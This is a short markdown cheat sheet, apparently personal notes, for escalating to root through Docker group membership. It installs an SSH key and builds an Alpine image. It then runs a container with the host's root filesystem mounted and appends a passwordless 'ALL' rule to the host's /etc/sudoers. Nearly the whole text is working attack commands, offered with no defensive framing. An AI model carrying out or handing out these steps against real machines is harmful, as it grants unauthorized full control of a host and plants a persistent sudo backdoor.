#### Copy Id 
```
ssh-copy-id -i id_rsa.pub user@ip
```
#### privilege escalation
- make directory
```
mkdir /home/user/directory
cd /home/user/directory
```
- build Dockerfile
```
FROM alpine
ENV WORKDIR /directory
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR
```

- build and run container 
```
docker build -t directory .
docker run -v /:/directory -it directory /bin/sh
```
- take over control :>
```
echo "username ALL=(ALL) NOPASSWD:ALL" >> /directory/etc/sudoers
```
